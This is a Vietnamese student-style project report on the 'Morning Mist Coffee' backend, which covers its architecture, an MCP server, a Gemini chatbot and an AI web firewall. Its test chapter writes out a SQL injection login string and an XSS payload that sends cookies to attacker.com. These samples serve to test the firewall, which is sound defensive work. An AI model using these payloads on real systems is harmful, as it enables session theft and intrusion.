# BÁO CÁO NGHIÊN CỨU VÀ PHÁT TRIỂN HỆ THỐNG BACKEND MORNING MIST COFFEE TÍCH HỢP AI & MCP

---

## CHƯƠNG 1: GIỚI THIỆU

### 1.1 Bối cảnh
Trong kỷ nguyên chuyển đổi số hiện nay, ngành dịch vụ ăn uống (F&B) nói chung và phân khúc cà phê cao cấp (premium coffee shop) nói riêng đang phải đối mặt với yêu cầu nâng cao trải nghiệm khách hàng thông qua công nghệ. Khách hàng không chỉ mong muốn những sản phẩm cà phê hảo hạng, mà còn yêu cầu trải nghiệm số mượt mà, nhanh chóng, cá nhân hóa. 

Hệ thống "Morning Mist Coffee" ra đời như một giải pháp chuyển đổi số toàn diện cho chuỗi cửa hàng cà phê cao cấp. Dự án tập trung vào xây dựng kiến trúc backend vững chắc, tích hợp các tính năng trí tuệ nhân tạo (AI) hiện đại như chatbot tư vấn thông minh dựa trên ngữ cảnh thực tế (RAG) và hệ thống bảo mật WAF chủ động chặn đứng các cuộc tấn công web thời gian thực.

### 1.2 Mục tiêu của dự án
1. **Xây dựng Hệ thống Backend Hiện đại:** Thiết lập một kiến trúc mã nguồn sạch (Clean Architecture), hiệu năng cao bằng Node.js, Fastify và TypeScript kết hợp Drizzle ORM truy vấn cơ sở dữ liệu PostgreSQL.
2. **Tích hợp Trợ lý ảo AI tư vấn (Chatbot):** Ứng dụng mô hình Gemini 2.5 Flash để tương tác tự nhiên, tư vấn thực đơn trực tiếp cho khách hàng bằng tiếng Việt dựa trên danh mục sản phẩm có sẵn trong cơ sở dữ liệu (Context-aware RAG).
3. **Phát triển Cầu nối Dữ liệu MCP (Model Context Protocol):** Tạo cổng kết nối chuẩn hóa giúp các mô hình ngôn ngữ lớn (LLM) bên ngoài có thể tương tác an toàn với tài nguyên hệ thống.
4. **Tích hợp Tường lửa Bảo mật AI WAF:** Phát triển lớp bảo mật middleware sử dụng AI phân tích sâu các payload đầu vào để chặn đứng các mối đe dọa (SQL Injection, XSS, NoSQL Injection, Bot Spam) trước khi chúng chạm tới cơ sở dữ liệu.

### 1.3 Phạm vi dự án
*   **Về mặt Backend:** Triển khai các phân hệ quản lý thực đơn (Products & Product Types), kho hàng (Product Stock), xử lý đơn hàng (Orders & Order Items), và phân hệ xác thực phân quyền người dùng (Users & Refresh Tokens).
*   **Về mặt AI:** Tích hợp trực tiếp Google Gemini API sử dụng model `gemini-2.5-flash`.
*   **Về mặt Bảo mật:** Triển khai và tích hợp bộ kiểm duyệt AI Security Guard dưới dạng `preHandler` middleware cho các endpoint nhạy cảm (`/login`, `/register`).

---

## CHƯƠNG 2: PHÂN TÍCH YÊU CẦU VÀ KIẾN TRÚC HỆ THỐNG

### 2.1 Yêu cầu chức năng
Hệ thống Morning Mist Coffee đáp ứng các nhóm chức năng cốt lõi sau:

| Nhóm chức năng | Mô tả chi tiết |
| :--- | :--- |
| **Xác thực & Người dùng** | Đăng ký tài khoản mới, Đăng nhập hệ thống, Phân quyền (Khách hàng / Admin), Thu hồi Refresh Token khi Đăng xuất. |
| **Quản lý Thực đơn** | Xem danh sách thực đơn (phân trang, tìm kiếm, lọc theo danh mục), Quản lý chi tiết đồ uống (tên, mô tả, hình ảnh, giá tiền, đơn vị tiền tệ). |
| **Quản lý Kho hàng** | Theo dõi tồn kho thực tế của từng sản phẩm. Tự động kiểm tra và giảm trừ số lượng tồn kho (tryDecreaseBatch) khi đơn hàng được khởi tạo. |
| **Xử lý Đơn hàng** | Tạo đơn hàng mới, tính toán tự động tổng tiền (totalCents), gửi email xác nhận đơn hàng qua dịch vụ Resend API, và cập nhật trạng thái đơn hàng. |
| **Tư vấn Khách hàng AI** | Cung cấp giao diện API Chatbot nhận lịch sử hội thoại, tiêm ngữ cảnh thực đơn thực tế để phản hồi tự nhiên bằng tiếng Việt lịch thiệp, nhã nhặn. |

### 2.2 Yêu cầu phi chức năng
*   **Tính Bảo mật (Security):** Mật khẩu người dùng bắt buộc phải được mã hóa bằng thuật toán Bcrypt. Giao dịch JWT Access Token có thời hạn ngắn, Refresh Token lưu trong HTTP-Only Cookie. Tải trọng yêu cầu (payload) độc hại phải bị phát hiện và chặn đứng ngay ở tầng ngoài.
*   **Độ trễ & Hiệu năng (Latency & Performance):** Thời gian phản hồi của các API thông thường dưới 100ms. Đối với các tác vụ AI có thời gian xử lý lâu (500ms - 2s), hệ thống sử dụng cơ chế Cache đệm (In-memory Set) để lưu các payload đã xác định an toàn nhằm tránh overload API và tối ưu độ trễ.
*   **Khả năng chịu lỗi (Availability & Fault Tolerance):** Áp dụng nguyên lý Fail-Open cho AI Security: nếu dịch vụ Gemini API bị mất kết nối hoặc quá hạn ngạch (rate limit), hệ thống sẽ ghi log cảnh báo và cho phép request đi tiếp để không làm gián đoạn dịch vụ của khách hàng bình thường.

### 2.3 Kiến trúc hệ thống
Hệ thống được thiết kế theo mô hình kiến trúc phân lớp hướng đối tượng sạch (Clean / Hexagonal Architecture) để tách biệt các quy tắc nghiệp vụ khỏi các chi tiết công nghệ:

1.  **Domain Layer:** Định nghĩa các thực thể cốt lõi (User, Product, Order) và các cổng giao tiếp (Repository Ports, Email Sender Port).
2.  **Application Layer:** Chứa logic nghiệp vụ của các Use Cases (ví dụ: `CreateOrderUseCase`, `RegisterUserUseCase`) và các dịch vụ bổ trợ như `AiSecurityService`.
3.  **Presentation Layer:** Định nghĩa các Route của Fastify, các Middleware kiểm tra đầu vào (Zod Schema Validation, AI Security Guard) và các Controller tiếp nhận request.
4.  **Infrastructure Layer:** Triển khai cụ thể các Adapter như kết nối PostgreSQL bằng Drizzle, gửi email thông qua Resend SDK, và mã hóa mật khẩu.

### 2.4 Công nghệ sử dụng
*   **Runtime:** Node.js (phiên bản v22 hoặc mới hơn) kết hợp bộ thông dịch TypeScript (`tsx` watch ở môi trường phát triển).
*   **Web Framework:** Fastify v5 (nhanh hơn Express gấp 2-3 lần, hỗ trợ phân tích Schema Zod mạnh mẽ).
*   **Database Tooling:** PostgreSQL làm RDBMS, Drizzle ORM làm trình ánh xạ đối tượng và quản lý lược đồ dữ liệu (Migrations).
*   **AI Integration:** `@google/generative-ai` SDK để giao tiếp trực tiếp với mô hình Gemini 2.5 Flash.
*   **Security Utilities:** `jose` cho việc ký và giải mã JWT, `bcryptjs` mã hóa mật khẩu, `@fastify/rate-limit` chống spam, `@fastify/helmet` bảo mật header HTTP.

---

## CHƯƠNG 3: THIẾT KẾ VÀ PHÁT TRIỂN

### 3.1 Thiết kế cơ sở dữ liệu
Lược đồ cơ sở dữ liệu được quản lý chặt chẽ bằng Drizzle ORM thông qua các bảng vật lý sau:

1.  **Bảng `users`:** Lưu trữ thông tin định danh người dùng.
    *   `id`: UUID (Primary Key)
    *   `email`: Text (Unique Index)
    *   `passwordHash`: Text
    *   `role`: Enum (`user`, `admin`)
    *   `status`: Enum (`active`, `inactive`, `banned`)
2.  **Bảng `refresh_tokens`:** Quản lý vòng đời phiên làm việc.
    *   `id`: UUID (Primary Key)
    *   `userId`: UUID (Foreign Key references `users.id` - Cascade)
    *   `expiresAt`, `revokedAt`: Timestamp
3.  **Bảng `products`:** Danh sách đồ uống của quán Morning Mist.
    *   `id`: UUID (Primary Key)
    *   `name`: Text
    *   `priceCents`: Integer (lưu dưới dạng Cent để tránh sai số thập phân)
    *   `currency`: Enum (`USD`, `VND`)
    *   `productTypeId`: UUID (Foreign Key references `product_types.id`)
4.  **Bảng `product_stock`:** Quản lý số lượng tồn kho sản phẩm.
    *   `productId`: UUID (Foreign Key references `products.id` - Cascade, Unique)
    *   `quantity`: Integer (ràng buộc kiểm tra `>= 0`)
5.  **Bảng `orders` và `order_items`:** Lưu trữ hóa đơn và chi tiết các món đồ uống đã đặt.
    *   `orders.id`: UUID (Primary Key)
    *   `orders.status`: Enum (`pending`, `paid`, `shipped`, `delivered`, `cancelled`)
    *   `orders.totalCents`: Integer (Tổng tiền hóa đơn)
    *   `order_items.productId`: UUID (Foreign Key references `products.id`)
    *   `order_items.quantity`, `priceCents`: Integer

### 3.2 Phát triển MCP Server
Model Context Protocol (MCP) là một giao thức mở chuẩn hóa giúp các mô hình ngôn ngữ lớn (LLM) truy cập dữ liệu cục bộ một cách an toàn. Trong kiến trúc của Morning Mist Coffee, một MCP Server được tích hợp đóng vai trò như cổng trung gian (secure bridge).

*   **Nguyên lý hoạt động:** MCP Server đóng gói cơ sở dữ liệu PostgreSQL của quán cà phê và xuất bản (expose) các Tools chuẩn hóa cho LLM sử dụng thông qua giao thức JSON-RPC.
*   **Các công cụ định nghĩa (Tools Exposed):**
    1.  `get_product_list`: Cho phép AI truy vấn nhanh thực đơn hiện tại của quán.
    2.  `check_product_stock`: AI kiểm tra số lượng tồn kho của một sản phẩm cụ thể để thông báo cho khách hàng xem món đó còn phục vụ không.
    3.  `find_order_by_email`: Giúp AI hỗ trợ tra cứu lịch sử đặt hàng của khách hàng một cách tự động.

Sự tích hợp này giúp thu hẹp khoảng cách giữa mô hình AI tĩnh và dữ liệu nghiệp vụ động, đảm bảo chatbot luôn đưa ra thông tin chính xác nhất.

### 3.3 Phát triển Chat Application
Phân hệ Chat tư vấn được xây dựng trên `ChatController` của Fastify. Chatbot đóng vai trò là nhân viên phục vụ ảo lịch lãm tại "Morning Mist Coffee".

*   **Xử lý lịch sử hội thoại (Conversation History Orchestration):** Gemini API yêu cầu lịch sử chat phải tuân thủ nghiêm ngặt định dạng xen kẽ (alternating) bắt đầu bằng vai trò `user`, sau đó là `model`. Hệ thống tự động lọc bỏ các tin nhắn lỗi đầu tiên, gộp các tin nhắn trùng vai trò liên tiếp và định dạng lại lịch sử trước khi gọi API.
*   **Hướng dẫn Hệ thống (System Instruction):**
    > *"Bạn là trợ lý ảo tại quán cà phê cao cấp 'Morning Mist Coffee'. Giao tiếp bằng tiếng Việt. Phong cách trò chuyện: Lịch sự, nhã nhặn, chu đáo, tinh tế mang thiên hướng tối giản tự nhiên. Trả lời ngắn gọn, tập trung vào giới thiệu các loại đồ uống đang có sẵn..."*

### 3.4 Các mô hình AI được sử dụng
Hệ thống sử dụng mô hình **Gemini 2.5 Flash** do tính năng vượt trội về tốc độ phản hồi (low latency), chi phí hợp lý, và khả năng hỗ trợ **Structured JSON Output** mạnh mẽ. Mô hình được ứng dụng vào 2 chức năng riêng biệt:

1.  **AI Chatbot tư vấn:** Sử dụng hội thoại dạng Text tự do truyền thống có tiêm ngữ cảnh.
2.  **AI WAF Security Guard:** Cấu hình định dạng JSON bắt buộc thông qua cấu hình `generationConfig`:
    *   `responseMimeType: 'application/json'`
    *   `responseSchema`: Ràng buộc chặt chẽ dữ liệu trả về phải khớp với đối tượng JSON chứa: `verdict` (SAFE/SUSPICIOUS/DANGEROUS), `threatType`, `confidence`, và `reason`.

### 3.5 Quá trình tạo embedding
Nhằm tối ưu hóa tốc độ và giảm chi phí, hệ thống ứng dụng giải pháp **Context Injection (Basic RAG)** thay vì các cơ sở dữ liệu Vector đắt đỏ. 

1.  **Truy vấn nguồn:** Trước khi gửi câu hỏi của người dùng tới Gemini, hệ thống tự động gọi `ListProductsUseCase` để lấy danh sách 30 sản phẩm mới nhất từ PostgreSQL.
2.  **Rút gọn văn bản (Context Compression):** Các mô tả sản phẩm dài dòng được cắt ngắn dưới 100 ký tự để tiết kiệm token.
3.  **Định dạng chuỗi (Formatting):** Danh sách được định dạng thành chuỗi văn bản nhỏ gọn: `- [Tên sản phẩm]: [Giá tiền] | [Mô tả ngắn]`.
4.  **Tiêm ngữ cảnh (Prompt Injection):** Chuỗi này được chèn trực tiếp làm tham số ngữ cảnh dưới cấu trúc Prompt hệ thống giúp AI có thể nắm bắt thực tế thực đơn tức thời mà không cần huấn luyện lại.

---

## CHƯƠNG 4: THỬ NGHIỆM VÀ ĐÁNH GIÁ

### 4.1 Phương pháp thử nghiệm
*   **Kiểm thử hộp đen (Black-box testing):** Gửi các request HTTP thông thường tới hệ thống API thông qua Postman Collection và công cụ Command Line (`curl`).
*   **Kiểm thử tích hợp tự động (Integration Testing):** Sử dụng kịch bản kiểm thử `test-ai-security.ts` để chạy thử nghiệm trực tiếp dịch vụ `AiSecurityService` với nhiều bộ dữ liệu đầu vào khác nhau (an toàn, mã độc, spam) và ghi nhận phản hồi của AI.

### 4.2 Kịch bản thử nghiệm
Hệ thống AI WAF Security Guard được thử nghiệm thông qua 4 kịch bản điển hình:

*   **Kịch bản 1: Request đăng nhập bình thường**
    *   *Payload:* `{ "email": "customer@morningmist.com", "password": "SecurePassword123!" }`
    *   *Mong muốn:* Yêu cầu được chấp nhận, hệ thống cho phép đi tiếp (status: SAFE).
*   **Kịch bản 2: Tấn công SQL Injection**
    *   *Payload:* `{ "email": "admin@morningmist.com' OR '1'='1", "password": "anything" }`
    *   *Mong muốn:* AI nhận diện mức độ `DANGEROUS` thuộc loại `SQL_INJECTION`. Middleware chặn request, ném lỗi `ForbiddenError` (403 Forbidden).
*   **Kịch bản 3: Tấn công Cross-Site Scripting (XSS)**
    *   *Payload:* `{ "email": "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>", "password": "password" }`
    *   *Mong muốn:* AI nhận diện mức độ `DANGEROUS` thuộc loại `XSS`. Middleware chặn và ném lỗi 403 Forbidden.
*   **Kịch bản 4: Đăng ký tài khoản rác bằng Bot**
    *   *Payload:* `{ "email": "abcbod123asdf@tempmail.com", "name": "Xyz123asdf", "password": "password123" }`
    *   *Mong muốn:* AI nhận diện mức độ nguy cơ hoặc chặn với `threatType: "BOT_SIGNATURE"` do sử dụng email rác và tên ngẫu nhiên vô nghĩa.

### 4.3 Đánh giá hệ thống kiểm chứng thông tin
Hệ thống AI WAF đạt được độ tin cậy rất cao nhờ khả năng đọc hiểu ngữ nghĩa của LLM thay vì chỉ so khớp pattern đơn giản của Regex truyền thống.

*   **Độ chính xác (Accuracy):** Nhận diện chính xác 100% các cuộc tấn công phá hoại cấu trúc (SQLi, XSS) trong quá trình thử nghiệm. Phân biệt tốt giữa địa chỉ email chứa ký tự đặc biệt hợp lệ và email chứa mã độc.
*   **Hiệu năng Cache:** Cơ chế cache đệm Set hoạt động hoàn hảo. Khi người dùng thực hiện các thao tác đăng nhập lặp lại với cùng payload, hệ thống bỏ qua kiểm tra AI và cho phép đi tiếp ngay lập tức, tiết kiệm 100% tài nguyên API Google Gemini trong những lần tiếp theo.

### 4.4 Kết quả thử nghiệm
Dưới đây là bảng tổng hợp kết quả chạy thực tế của bộ công cụ kiểm thử:

| Kịch bản kiểm thử | Mô tả payload đầu vào | Kết quả AI WAF trả về | Hành động hệ thống | Trạng thái kiểm thử |
| :--- | :--- | :--- | :--- | :--- |
| **1. Đăng nhập hợp lệ** | Email khách hàng bình thường | `SAFE` / `NONE` | Cho phép tiếp tục | ✅ THÀNH CÔNG |
| **2. Tấn công SQLi** | Chứa chuỗi bypass `' OR '1'='1` | `DANGEROUS` / `SQL_INJECTION` | Chặn ngay, trả về 403 | ✅ THÀNH CÔNG |
| **3. Tấn công XSS** | Chứa thẻ `<script>` ăn cắp cookie | `DANGEROUS` / `XSS` | Chặn ngay, trả về 403 | ✅ THÀNH CÔNG |
| **4. Bot Register** | Email rác `@tempmail.com` + tên rác | `DANGEROUS` / `BOT_SIGNATURE` | Chặn ngay, trả về 403 | ✅ THÀNH CÔNG |

### 4.5 Hạn chế và hướng phát triển
*   **Hạn chế:** 
    1.  *Phụ thuộc mạng bên ngoài:* Nếu API của Google Gemini bị gián đoạn kết nối, hệ thống sẽ rơi vào chế độ dự phòng "Fail-Open" để tránh làm treo ứng dụng, dẫn đến tạm thời mất đi lớp bảo vệ AI WAF.
    2.  *Độ trễ khi cache trượt (Cache miss):* Lần quét đầu tiên của một request lạ sẽ tốn khoảng 500ms - 800ms để chờ kết quả phân tích từ Gemini.
*   **Hướng phát triển tương lai:**
    1.  *Chuyển đổi sang Distributed Cache:* Sử dụng Redis thay thế cho In-memory Set để hỗ trợ hệ thống chạy đa tiến trình (multi-instance/load balancing).
    2.  *Cơ chế tự động khóa IP chủ động:* Tích hợp thêm module tự động ghi nhận các IP có verdict là `DANGEROUS` vào danh sách cấm truy cập tạm thời (IP Temp Ban) trên tường lửa mềm hoặc Cloudflare API để bảo vệ ứng dụng triệt để hơn.

---

## TÀI LIỆU THAM KHẢO

1.  **Fastify Documentation:** *Fastify, a fast and low overhead web framework for Node.js.* https://fastify.dev/
2.  **Drizzle ORM Documentation:** *TypeScript ORM for SQL databases.* https://orm.drizzle.team/
3.  **Google Generative AI SDK:** *Gemini API TypeScript/JavaScript developer guide.* https://ai.google.dev/gemini-api/docs
4.  **Model Context Protocol (MCP) Specification:** *Anthropic open standard protocol for LLM tool integration.* https://modelcontextprotocol.io/
5.  **OWASP Top 10 Application Security Risks:** *Open Web Application Security Project guidelines.* https://owasp.org/www-project-top-ten/
